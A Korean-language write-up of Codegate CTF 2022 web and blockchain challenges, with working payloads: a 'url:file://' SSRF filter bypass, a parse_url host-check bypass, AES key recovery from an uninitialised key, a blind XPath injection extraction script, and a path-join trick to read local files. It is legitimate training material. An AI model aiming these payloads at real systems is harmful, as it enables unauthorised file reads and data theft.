---
title: "Codegate 2022 Web/Blockchain Writeup"
description: "Codegate 2022 예선 Web 전체 문제 및 Blockchain(NFT) 문제 풀이"
date: 2022-02-27
tags: ["codegate", "ssrf", "xpath-injection", "aes", "blockchain"]
ctf: "Codegate CTF 2022"
published: true
---

본선 못갔으니 대충 쓰겠다..


웹을 너무 빨리 풀어서 블체만 봤는데 개인적으로 블체에 대해 너무 몰라서 많이 아쉬운 감이 있었다 흑흑..


nft 문제는 팀원인 epist가 도와줬다(ㄳㄳ)


---


### [Baby First]


### 요약


### ssrf로 regex검사를 우회하여 local file을 leak한다


당연히 baby 붙어있길래 이거부터 봐서 그런지 퍼스트 솔브를 먹어버린 문제이다 ;;;


![image](/images/writeups/codegate-2022-web-blockchain_4702c120.png)


대충 코드 보면class파일 내의lookupImg 함수에서 memo의 내용 중 [] 대괄호 안에 들어가는걸 url로 받아 image를 파싱해서 img tag에 넣어준다.


```py
pattern = Pattern.compile("^[a-z]+:");
 matcher = pattern.matcher(tmp);
 if (!matcher.find() || matcher.group().startsWith("file"))
 return "";
```


이 때 java.net.URL을 사용해서 넣어주는데, 그 전에 startsWith 함수로 file: 프로토콜로 시작하는지 검사한다.


java.net.URL을 auditing 해보면


**https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/19fb8f93c59dfd791f62d41f332db9e306bc1422/src/java.base/share/classes/java/net/URL.java#L575**

[GitHub - AdoptOpenJDK/openjdk-jdk11: Mirror of the jdk/jdk11 Mercurial forest at OpenJDKMirror of the jdk/jdk11 Mercurial forest at OpenJDK - GitHub - AdoptOpenJDK/openjdk-jdk11: Mirror of the jdk/jdk11 Mercurial forest at OpenJDKgithub.com](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/19fb8f93c59dfd791f62d41f332db9e306bc1422/src/java.base/share/classes/java/net/URL.java#L575)

![image](/images/writeups/codegate-2022-web-blockchain_83ff0f40.png)


위와같이 url: 로 시작하면 start(input argument, url)를 += 4 해주는것을 볼 수 있따.


memo=[url:file:///flag] 해주면 풀린다


![image](/images/writeups/codegate-2022-web-blockchain_393133c3.png)


---


### [ CAFE ]


### 요약 : xss bot에 admin password가 존재한다(언인텐), parse_url 버그(?)를 이용한다(인텐)


```php
case 'iframe':
 $src = $element->src;
 $host = parse_url($src)['host'];
 if (strpos($host, 'youtube.com') !== false){
 $result .= '<iframe src="'. str_replace('"', '', $src) .'"></iframe>';
 }
 break;
```


parse_url($src)['host']로 host 검사를 하는데, 이는 쉽게 우회가 가능하다.


관련된 문서로는 오랜지 형님 자료가 참 좋다.


찾기 귀찮으니 따로 링크는 올리지 않겠다.


```py
# xss bot python code

driver.get('http://3.39.55.38:1929/login')
driver.find_element_by_id('id').send_keys('admin')
driver.find_element_by_id('pw').send_keys('$MiLEYEN4') ## ????
driver.find_element_by_id('submit').click()
```


하튼 원래는 그런문제였지만 xss bot에 패스워드가 들어있었다.


웹 빠르게 다 풀고 블체까지 보고 완전히 실직한다음 인텐으로 다시 보려했지만 블록체인 한문제를 풀지못하고 그대로 대회가 끝나 보지 못했다. 대충 javascript://youtube.com/[개행][코드]로 하면 될거같다


---


​


### [ superbee ]


### 요약 : admin/password (언인텐) AES uninitialized key+padding it, iv from key decrypt


![image](/images/writeups/codegate-2022-web-blockchain_5a11d8a8.png)


난 솔직히 대회하면서 이문제가 왜 100점까지 털렸지라는 의문을 끝끝내 지울 수가 없었다.


아 그런데 대회가 끝나고보니 계정이 admin/password 였다고한다.


으..;


```
ar9ang3@ar9ang3:~/web/dirsearch$ nc 3.39.49.174 30001
GET /admin/authkey HTTP/1.2
Host: localhost

HTTP/1.1 200 OK
Date: Sat, 26 Feb 2022 11:44:45 GMT
Content-Length: 96
Content-Type: text/plain; charset=utf-8

00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```


일단 auth_key를 auth_secret_key였나? 하튼 그거가지고 AES CBC Encrypt해서 admin페이지에 뿌려준다


host localhost로 검사하고있지만 걍 직접 nc로 붙어서 host 바꿔주니 뚝 떨어졌다.


```go
func (this *AdminController) AuthKey() {
 encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
 this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}
```


대충 코드 보면 위에서 암호화할때 쓰이는 auth_crypt_key가 선언만 되어있고 값을 불러오지 않는다.


```go
func AesEncrypt(origData, key []byte) ([]byte, error) {
 padded_key := Padding(key, 16)
 block, err := aes.NewCipher(padded_key)
 if err != nil {
 return nil, err
 }
 blockSize := block.BlockSize()
 origData = Padding(origData, blockSize)
 blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
 crypted := make([]byte, len(origData))
 blockMode.CryptBlocks(crypted, origData)
 return crypted, nil
}
```


그러고 그걸 key size만큼 padding해주는데 그 결과는 \x10*16 이다


iv 또한 위의 padding으로 만들어진 key의 값에서 blocksize만큼 잘라서 쓰기 때문에 우리는 key와 iv를 모두 안다.


```
arang@DESKTOP-TUE2B66:/mnt/d/jw/personal/ctf/2022codegate$ python3 a.py
b'Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'
```


개같이 복호화


![image](/images/writeups/codegate-2022-web-blockchain_d5439748.png)


개같이 플래그


---


​


### [ myblog ]


### 요약 : blind xpath injection으로 catalina.properties에 설정된 environ variable leak


이제 jsp 문제 나오면 일단 톰캣, jdk부터 오디팅하는 습관이 들어져버렸다


대충 catalina.properties에 플래그 세팅해준거 보니 System.getProperty 같은 함수가 xpath 사용할 때 내부적으로 쓸거라 생각이 들어 우리의 갓-서브라임 형님께 ctrl+shift+f로 getProperty 검색해서 reference check를 했다


그러다보니 뭐 SecuritySupport.java에 쓰는게 있었는데 대충 기억해놓고있다가


![image](/images/writeups/codegate-2022-web-blockchain_bbd924f3.png)


대충 xpath function들 이용해서 풀거같아서 그쪽 보니 system-property라고 아주 좋아보이는 놈이 있었다.


1. [https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/Keywords.java#L301](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/Keywords.java#L301)
2. [https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/FunctionTable.java#L224](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/compiler/FunctionTable.java#L224)
3. [https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/functions/FuncSystemProperty.java#L101](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/com/sun/org/apache/xpath/internal/functions/FuncSystemProperty.java#L101)
4. [https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/jdk/xml/internal/SecuritySupport.java#L87](https://github.com/AdoptOpenJDK/openjdk-jdk11/blob/master/src/java.xml/share/classes/jdk/xml/internal/SecuritySupport.java#L87)


대충 위 흐름으로 호출되는거 볼 수 있는데


![image](/images/writeups/codegate-2022-web-blockchain_7d168b94.png)


로컬 테스트 bingo


[http://3.39.79.180/blog/read?idx=%27%20or%20@idx=string-length(string-length(system-property(%27flag%27))=46=%27true%27)-4%20and%20@idx=%271](http://3.39.79.180/blog/read?idx=%27%20or%20@idx=string-length(string-length(system-property(%27flag%27))=46=%27true%27)-4%20and%20@idx=%271)


대충 blind xpath injeciton 구문 짜서 length check하고


```py
from arang import *

s = requests.session()
proxies = {"http":"http://127.0.0.1:8888","https":"http://127.0.0.1:8888"}
headers = {"Cookie": "JSESSIONID=C37A435A55859F879AC71B4ECE966C07"}
s.proxies = proxies
s.headers = headers
s.verify = False
num = 1
#codegate
flag = "codegate2022{"
for i in range(len(flag)+1,46+1):
 for c in "0123456789abcdef}":
 url = f"http://3.39.79.180/blog/read?idx=' or @idx=string-length(substring(system-property('flag'),{i},1)='{c}'='true')-4 and @idx='1"
 r = s.get(url)
 if 'asdf' not in r.content.decode():
 flag += c
 print(f"[{len(flag)}/46] flag - {flag}")
 break
```


do exploit


![image](/images/writeups/codegate-2022-web-blockchain_92b9f263.png)


get flag


---


​


### [ nft ]


### 요약 : blockchain 이지만 webchall, 1day랑 python trick 이용


```js
modifier contains (string memory what, string memory where) {
 bytes memory whatBytes = bytes (what);
 bytes memory whereBytes = bytes (where);
 
 require(whereBytes.length >= whatBytes.length);
 
 bool found = false;
 for (uint i = 0; i <= whereBytes.length - whatBytes.length; i++) {
 bool flag = true;
 for (uint j = 0; j < whatBytes.length; j++)
 if (whereBytes [i + j] != whatBytes [j]) {
 flag = false;
 break;
 }
 if (flag) {
 found = true;
 break;
 }
 }
 require (!found);
 
 _;
 }
```


contains 함수가 좀 엉성하다


[requirements.txt 중]


Django==3.2.1


?


[https://packetstormsecurity.com/files/cve/CVE-2021-33571](https://packetstormsecurity.com/files/cve/CVE-2021-33571)

[CVE-2021-33571 ≈ Packet StormRed Hat Security Advisory 2021-4702-01 - Red Hat Satellite is a systems management tool for Linux-based infrastructure. It allows for provisioning, remote management, and monitoring of multiple Linux deployments with a single centralized tool. Issues addrepacketstormsecurity.com](https://packetstormsecurity.com/files/cve/CVE-2021-33571)

굿


```
>>> ipaddress.IPv4Address("127.0.0.01")
IPv4Address('127.0.0.1')
```


이제 127.00.0.1 주면 contains 우회할 수 있다


```
>>> uri="1.1.1.1/account/storages//a.b.c"
>>> nft_file = uri.split(nft_path + '/')[-1]
>>> nft_file
'/a.b.c'
>>> path = os.path.join(os.getcwd(), nft_path, nft_file)
>>> path
'/a.b.c'
```


```js
nft_file = uri.split(nft_path + '/')[-1]
 if nft_file.find('.') != -1 and nft_file.split('.')[-1]:
 path = os.path.join(os.getcwd(), nft_path, nft_file)

 with open(path, 'rb') as f:
 return f.read()
```


os.path.join 쓸 때 세번째 인자 절대경로 주면 절대경로로 바뀌어버리는 trick이 있다


이거랑 엮어쓰면


127.00.0.1/acount/storages//home/ctf/flag.txt


이렇게 주면 with open(path, 'rb') as f에서 path에 /home/ctf/flag.txt가 들어가게 되고 플래그를 읽을 수 있다.


취약점은 찾았으나 블체 눕눕이라 실제 익스를 못해서 팀원인 epist가 대신 익스해줬다(ㄳㄳ)